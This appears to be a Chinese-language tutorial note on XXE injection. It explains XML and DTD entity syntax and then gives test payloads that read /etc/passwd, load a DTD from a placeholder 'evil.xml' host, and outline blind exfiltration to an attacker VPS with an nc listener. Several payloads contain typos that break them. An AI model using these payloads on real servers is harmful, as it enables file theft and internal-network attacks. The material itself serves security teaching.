---
title: XXE
lang: zh
Date: 2025-04-18
---
## 概述
**XXE**（XML External Entity Injection）全称为XML 外部实体注⼊。

**XXE 漏洞** 是指攻击者构造恶意的 XML 数据，通过注入“外部实体”，从而达到 **读取本地文件**、**发起 SSRF 请求**、甚至 **远程代码执行（RCE）** 的目的。

## XML 格式规范

XML（eXtensible Markup Language）是可扩展标记语言，**类似 HTML，但没有预定义的标签，结构更严格**，主要用于存储和传输数据。

XML 的语⾔规范由⼀种叫做DTD（Document Type Definition）的⽂件进⾏控制。DTD ⽂件的作⽤就是声明了XML 的内容格式规范。

```
#XML声明
<?xml version="1.0" encoding="UTF-8"?>

#DTD
#元素<!ELEMENT name type>
<!DOCTYPE note[            #根元素定义
<!ELEMENT note (msg,name)>
<!ELEMENT msg (#PCDATA)>
<!ELEMENT name (#PCDATA)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

#XML文档元素

<note>
<msg>Welcome to Bejing</msg>
<name>&xxe;</name>
</note>

元素：元素是XML 以及HTML ⽂档的主要构件模块，元素可包含⽂本、其他元素或者空。
属性：属性可以提供有关元素的额外信息
实体：实体是⽤来定义普通⽂本的变量。实体引⽤就是对实体的引⽤。

PCADATA：PCDATA 是会被解析器解析的⽂本。这些⽂本将被解析器检查实体以及标记。
CDATA：CDATA 的意思是字符数据（character data）。CDATA 是不会被解析器解析的⽂本。
```

内部声明实体
```
<!ENTITY 实体名称 "实体的值">
```

```
<?xml version="1.0"?>
<!DOCTYPE note[
<!ELEMENT note (msg,name)>
<!ELEMENT msg (#PCDATA)>
<!ELEMENT name (#PCDATA)>
<!ENTITY message "Welcome to China!">
<!ENTITY n "xxe">
]>

<note>
<msg>&message;</msg>
<name>&n;</name>
</note>
```

DTD实体是⽤于定义引⽤普通⽂本或特殊字符的快捷⽅式的变量，可以内部声明或外部引⽤。

### 内部声明DTD
```
<!DOCTYPE 根元素 [元素声明]>
```
### 外部引入DTD
```
<!DOCTYPE 根元素 SYSTEM "⽂件名">
```

```
<!-- 2.xml -->
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "http://192.168.16.193/XXE/2.dtd">

<note>
<msg>Welcome to China!</msg>
<name>xxe</name>
</note>
```
```
<!-- 2.dtd -->
<!ELEMENT note (msg,name)>
<!ELEMENT msg (#PCDATA)>
<!ELEMENT name (#PCDATA)>
<!ENTITY message "Welcome to China!">
<!ENTITY n "xxe">
```

### 引⽤外部实体
```
<!ENTITY 实体名称 SYSTEM "URI">
```

```
$xml =<<<XML

<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY xxe SYSTEM "http://192.168.16.193/XXE/3.txt">
]>

<x>&xxe;</x>

XML;
$data = simplexml_load_string($xml);
print_r($data);

```

## 判断&测试

最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返

回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞。

### 判断是否支持外部实体

方法比较简单，就是构造加载外部实体的payload，然后查看是否成果加载，代码如下：
```
<?xml version=”1.0” encoding=”UTF-8”?>
<!DOCTYPE ANY [
<!ENTITY % shit SYSTEM “http://testhost/evil.xml”>
%shit;
]>
```
如果testhost服务器监听到http请求，则支持外部实体。

### 有回显读文件
```
<?xml version=“1.0” encoding=“utf-8”?>
<!DOCTPE xxe[
<!ENTITY xxe SYSTEM file:///etc/passwd>]>
<xxe>&xxe;</xxe>
```
### 无回显bind rce

有了前面使用外部DTD文件来拼接内部DTD的参数实体的经验，我们可以知道，通过外部DTD的方式可以将内部参数实体的内容与外部DTD声明的实体的内容拼接起来，那么我们就可以有这样的设想：
1. 客户端发送payload 1给web服务器
2. web服务器向vps获取恶意DTD，并执行文件读取payload2
3. web服务器带着回显结果访问VPS上特定的FTP或者HTTP
4. 通过VPS获得回显（nc监听端口）

核⼼思路：第⼀个是访问本地资源，第⼆个是访问外部资源
1. 读取任意⽂件
2. 执⾏系统命令
3. 攻击内⽹⽹站

## XXE-lab
参考 [XXE-lab](https://blog.desolatehao.top/posts/tech/XXE-lab/)